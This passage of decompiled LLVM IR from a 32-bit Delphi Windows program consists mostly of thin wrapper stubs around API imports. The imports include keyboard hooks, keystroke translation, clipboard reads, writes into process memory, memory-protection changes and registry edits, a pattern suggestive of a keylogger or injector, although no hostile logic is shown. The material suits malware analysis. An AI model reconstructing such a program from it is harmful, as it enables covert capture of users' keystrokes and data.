  br label %dec_label_pc_4036c6, !insn.addr !85

dec_label_pc_4036c6:                              ; preds = %dec_label_pc_4036c2, %dec_label_pc_4036bc, %dec_label_pc_4036b8
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036c8() local_unnamed_addr {
dec_label_pc_4036c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208333, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403718:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_40371d() local_unnamed_addr {
dec_label_pc_40371d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_403720() local_unnamed_addr {
dec_label_pc_403720:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403725() local_unnamed_addr {
dec_label_pc_403725:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403767() local_unnamed_addr {
dec_label_pc_403767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038bf() local_unnamed_addr {
dec_label_pc_4038bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_40396b() local_unnamed_addr {
dec_label_pc_40396b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a6f() local_unnamed_addr {
dec_label_pc_403a6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403c7e() local_unnamed_addr {
dec_label_pc_403c7e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403c87() local_unnamed_addr {
dec_label_pc_403c87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403c88() local_unnamed_addr {
dec_label_pc_403c88:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403c8f, label %dec_label_pc_403c8c, !insn.addr !100

dec_label_pc_403c8c:                              ; preds = %dec_label_pc_403c88
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403c8f, !insn.addr !101

dec_label_pc_403c8f:                              ; preds = %dec_label_pc_403c8c, %dec_label_pc_403c88
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403c90() local_unnamed_addr {
dec_label_pc_403c90:
  %0 = call i32 @function_403c88(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403ca8:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cad() local_unnamed_addr {
dec_label_pc_403cad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cb0:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403f84:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403f89() local_unnamed_addr {
dec_label_pc_403f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403f8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f8b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_40403a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40403f() local_unnamed_addr {
dec_label_pc_40403f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_404041(i32 %arg1) local_unnamed_addr {
dec_label_pc_404041:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_404092:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_404097() local_unnamed_addr {
dec_label_pc_404097:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_404099(i32 %arg1) local_unnamed_addr {
dec_label_pc_404099:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.24() local_unnamed_addr {
dec_label_pc_404170:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_404178:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_404180:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404188:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.22(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404190:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.23(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_404198:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041ac:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042b0:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"(i32) local_unnamed_addr

define i32 @function_404304() local_unnamed_addr {
dec_label_pc_404304:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_409658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_409658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404329() local_unnamed_addr {
dec_label_pc_404329:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40432e() local_unnamed_addr {
dec_label_pc_40432e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_404330(i32 %arg1) local_unnamed_addr {
dec_label_pc_404330:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404334() local_unnamed_addr {
dec_label_pc_404334:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_409658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_40433c() local_unnamed_addr {
dec_label_pc_40433c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_409660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_409660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_404361() local_unnamed_addr {
dec_label_pc_404361:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404366() local_unnamed_addr {
dec_label_pc_404366:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404368(i32 %arg1) local_unnamed_addr {
dec_label_pc_404368:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_40436c() local_unnamed_addr {
dec_label_pc_40436c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_409660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_404374() local_unnamed_addr {
dec_label_pc_404374:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_40437c(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_40437c:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_404384(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_404384:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_40438c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40438c:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_404394(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_40439c(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_40439c:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043a4(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043a4:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043ac(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043ac:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043b4(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043b4:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043bc(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043bc:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043c4(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043c4:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043cc(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043cc:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_4043d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4043d4:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_4043dc(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_4043dc:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_4043e4(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_4043e4:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_4043ec() local_unnamed_addr {
dec_label_pc_4043ec:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_4043f4(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_4043f4:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_4043fc(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_4043fc:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404404(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404404:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_40440c(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_40440c:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404414(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404414:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_40441c() local_unnamed_addr {
dec_label_pc_40441c:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404424(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404424:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_40442c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40442c:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404434(i32* %hMem) local_unnamed_addr {
dec_label_pc_404434:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_40443c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40443c:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404444(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404444:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_40444c(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_40444c:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404454(i32* %hFile) local_unnamed_addr {
dec_label_pc_404454:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_40445c(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_40445c:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404464(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404464:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_40446c() local_unnamed_addr {
dec_label_pc_40446c:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_404474(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_404474:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_40447c(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_40447c:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_404484(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_404484:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_40448c(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_40448c:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_404494(i32 %i) local_unnamed_addr {
dec_label_pc_404494:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_40449c(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_40449c:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044a4(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044a4:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044b4(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044b4:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044bc(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044bc:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044c4(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044c4:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044cc(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044cc:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_4044d4(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_4044d4:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_4044dc(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_4044dc:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_4044e4(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_4044e4:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_4044ec(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_4044ec:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_4044f4(i32 %uFormat) local_unnamed_addr {
dec_label_pc_4044f4:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_4044fc(i32* %hWnd) local_unnamed_addr {
dec_label_pc_4044fc:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404504(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404504:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_40450c(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_40450c:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404514(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404514:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_40451c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40451c:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404524(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404524:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_40452c(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_40452c:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404534(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404534:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_40453c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40453c:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404544(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404544:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_40454c:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404554(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404554:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_40455c(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_40455c:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404564(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404564:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_40456c(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_40456c:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_404574(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_404574:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_40457c(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_40457c:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_404584(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_404584:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_40458c(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_40458c:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_404594(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_404594:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_40459c(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_40459c:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045a4(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045a4:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045ac() local_unnamed_addr {
dec_label_pc_4045ac:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045b4:
  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404614() local_unnamed_addr {
dec_label_pc_404614:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
